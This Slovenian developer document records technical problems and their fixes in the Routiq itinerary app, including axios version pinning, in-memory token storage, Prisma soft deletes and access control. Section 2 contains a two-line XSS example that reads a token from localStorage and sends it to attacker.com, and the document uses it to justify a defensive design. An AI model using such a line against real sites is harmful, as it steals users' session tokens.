# Izzivi in rešitve — Routiq

← [Nazaj na README](../README.md)

Dokument opisuje konkretne tehnične probleme ki so se pojavili med razvojem in kako so bili rešeni.

---

## 1. Supply chain napad na Axios

**Problem:**  
Marca 2026 je napadalska skupina UNC1069 kompromentirala npm paketa `axios@1.14.1` in `axios@0.30.4` z maliciozno kodo. Paketi so bili dostopni na npm za krajši čas preden je bila napaka odkrita.

**Tveganje:**  
Projekti z `"axios": "^1.x"` v `package.json` bi ob `npm install` avtomatično dobili okuženo verzijo.

**Rešitev:**  
Verzija `1.14.0` je **eksplicitno pinana** v obeh `package.json` datotekah (frontend + backend):

```json
// package.json
"dependencies": {
  "axios": "1.14.0"   // Ne "^1.14.0" — brez auto-update!
}
```

Posodobitev Axiousa zahteva eksplicitni tim dogovor in pregled:
1. Preveriti changelog za varnostne popravke
2. Zagnati `npm audit` po posodobitvi
3. Commitati spremembo z eksplicitnim opisom razloga

---

## 2. Varno shranjevanje access tokena

**Problem:**  
Standardna (in nevarna) praksa je shranjevanje JWT tokena v `localStorage`. Kateri koli JavaScript v isti domeni (vključno z XSS injicirano kodo) ga lahko prebere:

```javascript
// XSS napad bi storil:
const stolen = localStorage.getItem('access_token')
fetch('https://attacker.com/?token=' + stolen)
```

**Rešitev:**  
`access_token` je shranjen **izključno v React Context (RAM)**. Nikoli ne zapusti JavaScript memory — ni zapisan na disk, ni v `localStorage`, ni v `sessionStorage`.

`refresh_token` upravljajo Supabase SDK — ta ga hrani varno (httpOnly-style) brez eksplicitnega dostopa JS kode.

```typescript
// AuthContext.tsx — access token ostane v RAM
const accessTokenRef = useRef<string | null>(null)

supabase.auth.onAuthStateChange((event, session) => {
  accessTokenRef.current = session?.access_token ?? null
  setUser(session?.user ?? null)
})
```

Ko se stran osveži, Supabase SDK samodejno obnovi session — ni potrebno ručno shranjevati.

---

## 3. Soft delete middleware in Prisma konflikti

**Problem:**  
Implementirali smo Prisma middleware za soft delete ki avtomatično dodaja `WHERE deletedAt IS NULL` filter na vse `findMany` klice. Problem je nastal pri `findUnique` na unique poljih:

```typescript
// Prisma ne dovoli kombinacije unique lookup + custom where
prisma.groupMember.findUnique({
  where: {
    groupId_userId: { groupId, userId },
    deletedAt: null,  // ❌ TypeScript napaka!
  }
})
```

**Rešitev:**  
Middleware je bil prilagojen:
1. `findUnique` klici imajo posebno obravnavo — middleware ne aplicira soft-delete filtra
2. Za klice kjer je potreben dostop do "izbrisanih" zapisov (npr. re-invite DECLINED člana) se uporablja `upsert` z eksplicitnim `deletedAt: null` v `update`:

```typescript
await this.prisma.groupMember.upsert({
  where: { groupId_userId: { groupId, userId } },
  create: { role, status: 'PENDING', invitedById, invitedAt: new Date() },
  update: {
    status: 'PENDING',
    deletedAt: null,    // Eksplicitno "nezbriši"
    invitedAt: new Date(),
  },
})
```

---

## 4. Group itinerary access control

**Problem:**  
Endpoint `GET /itinerary/:id` je preverjal samo `userId == currentUser`. Člani skupin niso imeli dostopa do itinerarjev ki so bili v skupini deljeni s strani lastnika:

```
Lastnik doda itinerar v skupino → Člani skupin vidijo kartico v skupini
→ Klik na kartico → 403 Forbidden ❌
```

**Rešitev:**  
Query je bil razširjen da preveri dve možnosti: user je lastnik ATAU user je sprejet član skupin ki vsebuje ta itinerar:

```typescript
const itinerary = await this.prisma.itinerary.findFirst({
  where: {
    id,
    deletedAt: null,
    OR: [
      { userId },                                        // Lastnik
      {
        groupItineraries: {                               // Dodeljen skupini
          some: {
            deletedAt: null,
            group: {
              members: {
                some: {
                  userId,
                  status: 'ACCEPTED',                   // Aktivni član
                  deletedAt: null,
                }
              }
            }
          }
        }
      }
    ]
  }
})
```

---

## 5. Merge konflikti med vzporednimi feature branchi

**Problem:**  
Ekipa je vzporedno razvijala pet feature branchov: `feature/timetable`, `feature/exporting`, `feature/emojichat`, `style/light-mode`, `feature/editing`, `feature/groups`. Ob mergeu je prišlo do obsežnih konfliktov v skupnih komponentah (`DayCard.tsx`, `ItineraryPage.tsx`, `AttractionCard.tsx`).

**Rešitev:**  
Uveden je bil vmesni `feature/temp-merge` branch za postopno reševanje konfliktov pred merge-om v `development`:

```bash
# Vmesni branch za reševanje konfliktov
git checkout -b feature/temp-merge development
git merge feature/timetable
# Reši konflikte...
git merge feature/exporting
# Reši konflikte...
```

Za prihodnje: komponente so bile razdeljene v manjše, bolj fokusirane enote da se zmanjšajo prekrivanja pri razvoju.

---

## 6. Port management na Windows

**Problem:**  
Zaostali Node.js procesi na Windows so pogosto zasedli porte 3000 (backend) in 5173 (Vite frontend). Vite se je brez opozorila premaknil na port 5174, kar je pokvarilo CORS konfiguracija (backend je dovoljeval samo port 5173).

**Prvotna rešitev:**  
`scripts/free-port.ps1` PowerShell skripta ki je poiskala in ubila procese na portih 3000/5173 pred zagonom dev strežnika.

**Trajna rešitev:**  
Skripta je bila odstranjena (ekipa je prešla na Mac/Linux). V `vite.config.ts` je dodan:

```typescript
export default defineConfig({
  server: {
    port: 5173,
    strictPort: true,  // Napaka namesto tihega premika na drugi port
  }
})
```

`strictPort: true` zagotavlja da developer takoj opazi zaseden port namesto da tiho deluje na napačnem portu.

---

## 7. SSE streaming in timeout upravljanje

**Problem:**  
AI generiranje (Gemini) za daljše itinerarje (5+ dni) je občasno presegle privzete timeout vrednosti Axios-a in Node.js HTTP klienta.

**Rešitev:**  
- `withRetry()` utility z eksponentnim backoffom in jitter-om za klice na Gemini
- Eksplicitni 20s timeout na `generateStream` endpointu
- `useStream` hook na frontendu z eksplicitnim AbortController za cleanup ob unmount-u

```typescript
// withRetry() — exponential backoff z jitter
const delay = Math.min(
  backoffMs * Math.pow(2, attempt - 1),  // Eksponentni backoff
  maxBackoffMs
)
const jitter = Math.random() * 200       // Prepreči thundering herd
await sleep(delay + jitter)
```

**Zakaj jitter?**  
Brez jitter-ja bi vsi sočasni zahtevki po padcu storitve poskusili znova točno ob istem času — to bi povzročilo nov naval (thundering herd). Naključni jitter razporedi poizkuse.

---

## 8. Axios interceptor in SSE streaming konflikt

**Problem:**  
Axios interceptor za avtomatski token refresh je interferiral s SSE streaming konekcijo. Ob 401 napaki je interceptor poskušal narediti standardni request/response retry, kar pri SSE konekciji ni delalo pravilno.

**Rešitev:**  
SSE generiranje (`/itinerary/generate`) ne gre skozi Axios interceptor — namesto tega `useStream` hook neposredno uporablja Fetch API z ručno dodanim Bearer tokenom:

```typescript
// useStream.ts — direktni fetch brez Axios
const response = await fetch(`${VITE_API_URL}/itinerary/generate`, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    Authorization: `Bearer ${accessToken}`,
  },
  body: JSON.stringify(params),
  signal: abortController.signal,  // Cleanup ob unmount
})
```
